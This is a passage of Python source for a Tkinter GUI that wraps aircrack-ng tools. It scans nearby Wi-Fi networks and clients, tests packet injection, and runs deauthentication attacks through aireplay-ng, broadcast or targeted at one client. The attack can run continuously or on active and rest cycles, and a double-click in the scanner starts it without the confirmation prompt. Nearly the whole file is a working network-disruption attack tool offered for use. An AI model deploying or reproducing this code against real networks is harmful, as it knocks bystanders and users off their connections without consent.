            output = proc.stdout + proc.stderr
            if "Injection is working!" in output or "AP-less/client-less packet injection" in output: result_text = "Supported"
            elif "No Answer..." in output: result_text = "Not Supported (No Answer)"
            else:
                if fail_match := re.search(r'failed: (.*)', output): result_text = f"Failed ({fail_match.group(1)})"
        except subprocess.TimeoutExpired:
            result_text = "Test Timed Out"; self.log_message(f"Injection test for {interface_name} timed out.", "warning")
        except Exception as e:
            result_text = "Test Error"; self.log_message(f"Error during injection test for {interface_name}: {e}", "error")
        self.ui_update_queue.put(("injection_test_result", result_text))
            
    def try_auto_start_monitor_mode(self):
        adapter = self.adapter_var.get()
        if not adapter: self.log_message("No adapter selected, cannot auto-start monitor mode.", "warning"); return
        
        self.log_message(f"Attempting to automatically start monitor mode on {adapter}...", "info")
        self.ui_update_queue.put(("monitor_mode_status", ("ENABLING", None)))
        try:
            # subprocess.run(['airmon-ng', 'check', 'kill'], check=True, capture_output=True, text=True) # CHANGED: Keep NM active
            subprocess.run(['airmon-ng', 'start', adapter], check=True, capture_output=True, text=True)
            time.sleep(1)
            result = subprocess.run(['iwconfig'], check=True, capture_output=True, text=True)
            monitor_interface = next((line.split()[0] for line in result.stdout.split('\n') if 'Mode:Monitor' in line), None)
            if monitor_interface:
                self.monitor_interface = monitor_interface; self.adapter_var.set(monitor_interface)
                self.log_message(f"Successfully auto-started monitor mode on '{self.monitor_interface}'.", "success")
                self.ui_update_queue.put(("monitor_mode_status", ("ACTIVE", self.monitor_interface)))
                self.detect_adapters(); self.start_network_scan()
            else:
                raise Exception("Failed to verify auto-started monitor mode.")
        except Exception as e:
            self.log_message(f"Auto-start monitor mode failed: {e}", "error")
            self.ui_update_queue.put(("monitor_mode_status", ("FAILED", None)))

    def on_tree_click(self, event):
        if self.network_tree.identify_region(event.x, event.y) != "cell": return
        column, selected_iid = self.network_tree.identify_column(event.x), self.network_tree.focus()
        if not selected_iid: return
        current_values = list(self.network_tree.item(selected_iid, 'values')); bssid = current_values[1]
        if column == '#1':
            if current_values[0] == "☐": current_values[0] = "☑"; self.selected_networks.add(bssid)
            else: current_values[0] = "☐"; self.selected_networks.discard(bssid)
            self.network_tree.item(selected_iid, values=tuple(current_values))
        else:
            self.target_bssid.set(bssid); self.target_client_var.set("")
            self.log_message(f"Selected AP '{current_values[6]}' ({bssid}) for Deauth Attack.", "info")

    def on_client_select(self, event):
        if not (selected_item := self.client_tree.focus()): return
        if values := self.client_tree.item(selected_item, 'values'):
            self.target_client_var.set(values[0]); self.target_bssid.set(values[2]) 
            self.log_message(f"Selected Client '{values[0]}' as specific target.", "info")

    def copy_bssid(self):
        if not (selected_item := self.network_tree.focus()):
            messagebox.showinfo("Copy BSSID", "Please select a network from the list first."); return
        bssid = self.network_tree.item(selected_item, 'values')[1]
        pyperclip.copy(bssid); self.log_message(f"BSSID '{bssid}' copied to clipboard.", "success")
        
    def clear_log(self):
        self.log_area.configure(state="normal"); self.log_area.delete(1.0, tk.END); self.log_area.configure(state="disabled")
        self.log_message("On-screen log cleared by user.", "system")

    def show_clients_for_selected(self):
        if not self.selected_networks: messagebox.showinfo("No Selection", "Please select one or more networks using the checkboxes."); return
        self.log_message(f"Filtering clients for {len(self.selected_networks)} selected network(s)...", "info")
        self.client_tree.delete(*self.client_tree.get_children())
        for station, (pwr, bssid) in self.found_clients.items():
            if bssid in self.selected_networks: self.client_tree.insert('', 'end', values=(station, pwr, bssid))

    def start_monitor_mode(self):
        adapter = self.adapter_var.get()
        if not adapter: messagebox.showerror("Error", "No wireless adapter selected."); return
        self.log_message(f"Attempting to start monitor mode on {adapter}...", "info")
        self.ui_update_queue.put(("monitor_mode_status", ("ENABLING", None)))
        try:
            # subprocess.run(['airmon-ng', 'check', 'kill'], check=True, capture_output=True, text=True); self.log_message("Killed interfering processes.", "info") # CHANGED: Keep NM active
            self.log_message("Starting monitor mode without killing interfering processes...", "info")
            subprocess.run(['airmon-ng', 'start', adapter], check=True, capture_output=True, text=True); time.sleep(1) 
            result = subprocess.run(['iwconfig'], check=True, capture_output=True, text=True)
            monitor_interface = next((line.split()[0] for line in result.stdout.split('\n') if 'Mode:Monitor' in line), None)
            if monitor_interface:
                self.monitor_interface = monitor_interface; self.adapter_var.set(monitor_interface)
                self.log_message(f"Successfully enabled monitor mode on '{self.monitor_interface}'.", "success")
                self.ui_update_queue.put(("monitor_mode_status", ("ACTIVE", self.monitor_interface)))
                self.detect_adapters(); self.start_network_scan()
            else: raise Exception("Failed to verify monitor mode activation.")
        except Exception as e:
            self.log_message(f"Failed to enable monitor mode: {e}", "error"); self.ui_update_queue.put(("monitor_mode_status", ("FAILED", None)))
            messagebox.showerror("Error", f"Failed to start monitor mode.\n\n- Your wireless card may not support monitor mode.\n- Run 'sudo airmon-ng start {adapter}' in terminal for details.")

    def stop_monitor_mode(self, restart_nm=True):
        if not self.monitor_interface: return
        self.log_message(f"Stopping monitor mode on {self.monitor_interface}...", "info")
        self.ui_update_queue.put(("monitor_mode_status", ("DISABLING", self.monitor_interface)))
        try:
            subprocess.run(['airmon-ng', 'stop', self.monitor_interface], check=True, capture_output=True)
            self.log_message("Monitor mode stopped.", "success")
        except Exception as e: self.log_message(f"Error stopping monitor mode: {e}", "error")
        finally:
            self.monitor_interface = None; self.ui_update_queue.put(("monitor_mode_status", ("INACTIVE", None))); self.detect_adapters()
            if restart_nm:
                try:
                    subprocess.run(['systemctl', 'start', 'NetworkManager'], check=True, capture_output=True)
                    self.log_message("NetworkManager service started.", "info")
                except Exception as e: self.log_message(f"Could not start NetworkManager: {e}", "warning")
    
    def start_network_scan(self):
        if self.is_scanning: return
        if not self.monitor_interface: messagebox.showerror("Monitor Mode Required", "Please start monitor mode before scanning."); return
        self.is_scanning = True; self.ui_update_queue.put(("scan_status_change", True))
        self.scan_thread = threading.Thread(target=self.scan_loop_csv, daemon=True); self.scan_thread.start()

    def stop_network_scan(self):
        if not self.is_scanning: return
        self.is_scanning = False
        if self.scan_process and self.scan_process.poll() is None: self.scan_process.terminate()
        self.log_message("Network scan stopped by user.", "info")
        
    def scan_loop_csv(self):
        self.log_message("Starting CSV-based network scan...", "info"); self.ui_update_queue.put(("clear_all", None))
        for f in glob.glob(f"{self.scan_file_prefix}-*.csv"): 
            try: os.remove(f)
            except OSError: pass
        try:
            cmd = ['airodump-ng', self.monitor_interface, '-w', self.scan_file_prefix, '--output-format', 'csv', '--band', 'abg']
            self.scan_process = subprocess.Popen(cmd, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(2) 
            files = glob.glob(f"{self.scan_file_prefix}-*.csv")
            if not files:
                self.log_message("Error: airodump-ng did not create an output file. Trying again...", "error"); time.sleep(3)
                if not (files := glob.glob(f"{self.scan_file_prefix}-*.csv")):
                    self.log_message("Failed to create scan file on second attempt. Aborting scan.", "error")
                    self.ui_update_queue.put(("scan_status_change", False)); return
            
            csv_filename = files[0]; self.log_message(f"Reading scan data from {csv_filename}", "info")
            while self.is_scanning: self.parse_scan_csv(csv_filename); time.sleep(2)
        except Exception as e: self.log_message(f"An error occurred during scan: {e}", "error")
        finally:
            if self.scan_process and self.scan_process.poll() is None: self.scan_process.terminate()
            self.is_scanning = False; self.ui_update_queue.put(("scan_status_change", False)); self.log_message("Scan loop finished.", "info")

    def parse_scan_csv(self, filename):
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f: content = f.read()
            parts = re.split(r'\n\s*Station MAC,', content)
            ap_data, client_data = parts[0], parts[1] if len(parts) > 1 else ""
            for row in csv.reader(ap_data.splitlines()):
                if len(row) > 13 and "BSSID" not in row[0]:
                    bssid, pwr, ch, privacy, auth, essid = row[0].strip(), row[8].strip(), row[3].strip(), row[5].strip(), row[7].strip(), row[13].strip()
                    security_info = privacy
                    if "WPA" in security_info and "PSK" in auth: security_info += "-PSK"
                    if "MGT" in auth: security_info += " (WPA3)"
                    if "MFP" in auth: security_info += " +PMF"
                    try: band = "2.4 GHz" if 1 <= int(ch) <= 14 else "5 GHz" if int(ch) >= 36 else "Unknown"
                    except ValueError: band = "N/A"
                    if essid: self.ui_update_queue.put(("network_update", (bssid, pwr, ch, band, security_info, essid)))
            
            for row in csv.reader(client_data.splitlines()):
                 if len(row) > 5 and "Station MAC" not in row[0]:
                    self.ui_update_queue.put(("client_update", (row[0].strip(), row[3].strip(), row[5].strip())))
        except FileNotFoundError: pass
        except Exception as e: self.log_message(f"Error parsing scan file: {e}", "error")

    def start_deauth_from_scan(self, event):
        if not (selected_iid := self.network_tree.focus()): return
        bssid, essid = self.network_tree.item(selected_iid, 'values')[1], self.network_tree.item(selected_iid, 'values')[6]
        self.target_bssid.set(bssid); self.target_client_var.set("") 
        self.log_message(f"Auto-starting deauth for '{essid}' ({bssid}) from scanner.", "system")
        self.notebook.select(self.deauth_frame); self.start_deauth_attack(auto_start=True)

    def start_deauth_attack(self, auto_start=False):
        if self.is_deauthing: return
        if not self.terms_var.get(): messagebox.showerror("Terms Required", "You must accept the terms and conditions."); return
        target_bssid = self.target_bssid.get()
        if not re.match(r'^([0-9A-Fa-f]{2}[:-]){5}([0-9A-Fa-f]{2})$', target_bssid): messagebox.showerror("Invalid Target", "Please enter or select a valid target AP BSSID."); return
        if not self.monitor_interface:
            self.start_monitor_mode()
            if not self.monitor_interface: messagebox.showerror("Failed", "Could not start monitor mode. Cannot proceed."); return
        if target_bssid in self.found_networks and "+PMF" in self.found_networks[target_bssid][3]:
             if not auto_start and not messagebox.askokcancel("PMF Detected", "This network uses Protected Management Frames (PMF).\nThe deauthentication attack is very likely to fail.\n\nDo you want to proceed anyway?"): return
        
        target_client = self.target_client_var.get()
        if not target_client: self.log_message("Target client is empty. Preparing a broadcast deauth attack.", "info")
        if auto_start or messagebox.askokcancel("Confirm Attack", f"You are about to start a {'targeted' if target_client else 'broadcast'} deauth attack on {target_bssid}.\nThis will disrupt network connectivity.\n\nProceed only if you have permission."):
            self.is_deauthing = True; self.ui_update_queue.put(("deauth_status_change", True))
            self.deauth_thread = threading.Thread(target=self.run_deauth_attack_cycle, daemon=True); self.deauth_thread.start()

    def stop_deauth_attack(self):
        self.is_deauthing = False
        if self.deauth_process and self.deauth_process.poll() is None: self.deauth_process.terminate()
        if self.channel_lock_process and self.channel_lock_process.poll() is None: self.channel_lock_process.terminate()
        self.log_message("Deauth attack stopped by user.", "info")
    
    def _stream_process_output(self, process):
        try:
            if process.stdout:
                for line in iter(process.stdout.readline, ''):
                    self.log_message(f"[aireplay-ng] {line.strip()}", "attack")
                    if "DeAuth" in line or "deauthentication" in line: self.channel_match_event.set()
            if process.stderr:
                 for line in iter(process.stderr.readline, ''): self.log_message(f"[aireplay-ng ERROR] {line.strip()}", "error")
        except Exception: pass
        finally:
            if process and process.stdout: process.stdout.close()
            if process and process.stderr: process.stderr.close()
    
    def run_deauth_attack_cycle(self):
        target_bssid, target_client = self.target_bssid.get(), self.target_client_var.get()
        try:
            while self.is_deauthing:
                self.log_message(f"Searching for target AP: {target_bssid}", "info"); self.update_status("Current Phase", "SEARCHING FOR AP", "orange")
                channel, essid = None, None
                search_start_time = time.time()
                while self.is_deauthing:
                    if target_bssid in self.found_networks:
                        _, channel, essid, _ = self.found_networks[target_bssid]
                        self.log_message(f"Target '{essid}' ({target_bssid}) found on channel {channel}!", "success"); break
                    if time.time() - search_start_time > 60:
                        self.log_message("Could not find target AP within 60 seconds. Please check if it's in range.", "error")
                        self.is_deauthing = False; break
                    time.sleep(5)
                
                if not self.is_deauthing: break
                self.log_message(f"Locking interface to channel {channel}...", "info")
                self.channel_lock_process = subprocess.Popen(['airodump-ng', self.monitor_interface, '--bssid', target_bssid, '--channel', channel], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                time.sleep(2.5)
                self.deauth_process = self._start_aireplay_process(target_bssid, target_client)
                
                if self.continuous_deauth_var.get():
                    self.update_status("Current Phase", "ACTIVE (CONTINUOUS)", "red")
                    while self.is_deauthing and self.deauth_process and self.deauth_process.poll() is None: time.sleep(1)
                    if not self.is_deauthing: break
                    else: continue
                
                self.log_message("Waiting for aireplay-ng to start sending packets...", "info"); self.update_status("Current Phase", "INITIALIZING...", "orange")
                self.channel_match_event.clear()
                if not self.channel_match_event.wait(timeout=30):
                    self.log_message("Timeout waiting for packet confirmation. Target may be out of range. Restarting search.", "warning")
                    if self.deauth_process and self.deauth_process.poll() is None: self.deauth_process.terminate()
                    if self.channel_lock_process and self.channel_lock_process.poll() is None: self.channel_lock_process.terminate()
                    time.sleep(2); continue

                self.update_status("Current Phase", "ACTIVE (DEAUTHING)", "red")
                active_seconds = self.active_duration.get() * 60
                for i in range(active_seconds, 0, -1):
                    if not self.is_deauthing or (self.deauth_process and self.deauth_process.poll() is not None): break
                    self.update_progress((active_seconds - i) / active_seconds * 100); self.update_timer_display(i); time.sleep(1)
                
                if not self.is_deauthing: break
                if self.deauth_process and self.deauth_process.poll() is None: self.deauth_process.terminate()
                self.log_message("Active phase ended.", "info")

                self.update_status("Current Phase", "REST", "orange")
                rest_seconds = self.rest_duration.get() * 60
                for i in range(rest_seconds, 0, -1):
                    if not self.is_deauthing: break
                    self.update_progress((rest_seconds - i) / rest_seconds * 100); self.update_timer_display(i); time.sleep(1)
        except Exception as e: self.log_message(f"Deauth error: {e}", "error")
        finally:
            if self.channel_lock_process and self.channel_lock_process.poll() is None: self.channel_lock_process.terminate()
            if self.deauth_process and self.deauth_process.poll() is None: self.deauth_process.terminate()
            self.is_deauthing = False; self.ui_update_queue.put(("deauth_status_change", False))

    def _start_aireplay_process(self, target_bssid, target_client):
        cmd = ['aireplay-ng', '--deauth', '0', '-a', target_bssid]
        if target_client: cmd.extend(['-c', target_client])
        cmd.append(self.monitor_interface)
        process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, bufsize=1, universal_newlines=True)
        threading.Thread(target=self._stream_process_output, args=(process,), daemon=True).start()
        return process

    def log_message(self, message, tag=None): 
        if hasattr(self, 'logger'): self.logger.log(logging.WARNING if tag == "error" else logging.INFO, f"[{tag or 'general'}] {message}")
        self.ui_update_queue.put(("log", (message, tag)))

    def update_status(self, key, text, color="white"): self.ui_update_queue.put(("status", (key, text, color)))
    def update_progress(self, value): self.ui_update_queue.put(("progress", value))
    def update_timer_display(self, time_left):
        self.ui_update_queue.put(("timer", f"{int(time_left // 60):02d}:{int(time_left % 60):02d}"))

    def process_ui_updates(self):
        try:
            while not self.ui_update_queue.empty():
                try:
                    update_type, data = self.ui_update_queue.get_nowait()
                    if update_type == "log":
                        message, tag = data
                        self.log_area.configure(state="normal"); self.log_area.insert(tk.END, f"[{time.strftime('%H:%M:%S')}] {message}\n", tag)
                        self.log_area.configure(state="disabled"); self.log_area.see(tk.END)
                    elif update_type == "status": self.status_labels[data[0]].config(text=data[1], foreground=data[2])
                    elif update_type == "timer" and not self.continuous_deauth_var.get(): self.status_labels["Time Remaining"].config(text=data)
                    elif update_type == "progress" and not self.continuous_deauth_var.get(): self.progress_bar['value'] = data
                    elif update_type == "injection_test_result": self.adapter_injection_var.set(data)
                    elif update_type == "ap_mode_test_result": self.adapter_ap_mode_var.set(data)
                    elif update_type == "network_update":
                        bssid, pwr, ch, band, security, essid = data
                        values = ("☑" if bssid in self.selected_networks else "☐", bssid, pwr, ch, band, security, essid)
                        if bssid not in self.found_networks: self.found_networks[bssid] = (self.network_tree.insert('', 'end', values=values), ch, essid, security)
                        else: self.network_tree.item(self.found_networks[bssid][0], values=values); self.found_networks[bssid] = (self.found_networks[bssid][0], ch, essid, security)
                    elif update_type == "client_update": self.found_clients[data[0]] = (data[1], data[2])
                    elif update_type == "clear_all":
                        self.network_tree.delete(*self.network_tree.get_children()); self.client_tree.delete(*self.client_tree.get_children())
                        self.found_networks.clear(); self.found_clients.clear(); self.selected_networks.clear()
                    elif update_type == "scan_status_change": self.scan_button.config(state="disabled" if data else "normal"); self.stop_scan_button.config(state="normal" if data else "disabled")
                    elif update_type == "deauth_status_change":
                        self.start_deauth_button.config(state="disabled" if data else "normal"); self.stop_button.config(state="normal" if data else "disabled")
                        if not data: self.update_status("Current Phase", "IDLE", "white"); self.progress_bar['value'] = 0; self.status_labels["Time Remaining"].config(text="N/A" if self.continuous_deauth_var.get() else "00:00")
                    elif update_type == "monitor_mode_status":
                        status, interface = data
                        if status == "ACTIVE": self.monitor_status_label.config(text=f"Monitor Mode: ACTIVE ({interface})", foreground="green"); self.monitor_button.config(state="disabled"); self.stop_monitor_button.config(state="normal")
                        elif status == "INACTIVE": self.monitor_status_label.config(text="Monitor Mode: INACTIVE", foreground="red"); self.monitor_button.config(state="normal"); self.stop_monitor_button.config(state="disabled")
                        elif status == "ENABLING": self.monitor_status_label.config(text="Monitor Mode: ENABLING...", foreground="orange")
                        elif status == "DISABLING": self.monitor_status_label.config(text=f"Monitor Mode: DISABLING {interface}...", foreground="orange")
                        elif status == "FAILED": self.monitor_status_label.config(text="Monitor Mode: FAILED", foreground="red")
                except Exception as e: print(f"Error processing UI update: {e}")
        finally: 
            if self.root.winfo_exists(): self.root.after(100, self.process_ui_updates)
            
    def configure_resizing(self):
        self.root.columnconfigure(0, weight=1); self.root.rowconfigure(0, weight=1)
        self.main_frame.columnconfigure(0, weight=1); self.main_frame.rowconfigure(1, weight=1)

    def _cleanup_resources(self):
        print(f"Cleaning up resources for instance {self.instance_id}...")
        self.log_message(f"Initiating cleanup for instance {self.instance_id}.", "system")
        if hasattr(self, 'oneshot_instance'): self.oneshot_instance.on_closing()
        self.is_scanning = False; self.is_deauthing = False
        if self.scan_process and self.scan_process.poll() is None: self.scan_process.terminate()
        if self.deauth_process and self.deauth_process.poll() is None: self.deauth_process.terminate()
        if self.channel_lock_process and self.channel_lock_process.poll() is None: self.channel_lock_process.terminate()
        
        if self.is_main_window and self.monitor_interface:
            print(f"Instance {self.instance_id} (Main): Stopping monitor mode on {self.monitor_interface}")
            self.stop_monitor_mode(restart_nm=True) # Ensure NM is restarted
        
        for f in glob.glob(f"{self.scan_file_prefix}-*.*"): 
            try: os.remove(f); print(f"Instance {self.instance_id}: Removed temp file {f}")
            except OSError: pass

    def on_closing(self):
        if self.is_main_window:
            if messagebox.askyesno("Exit Confirmation", "Are you sure you want to exit?\nThis will close all application windows and stop network monitoring."):
                print("Main window closing. Cleaning up all remaining instances.")
                for instance in list(g_instances):
                    instance._cleanup_resources()
                    if instance.root.winfo_exists(): instance.root.destroy()
                if self.root.winfo_exists(): self.root.destroy()
        else:
            self._cleanup_resources()
            if self in g_instances: g_instances.remove(self)
            if self.root.winfo_exists(): self.root.destroy()

if __name__ == "__main__":
    if check_dependencies():
        root = tk.Tk()
        app = WifiToolsApp(root)
        try:
            if 'destroy' in dir(app.root): root.mainloop()
        except tk.TclError as e:
            if "application has been destroyed" not in str(e): raise

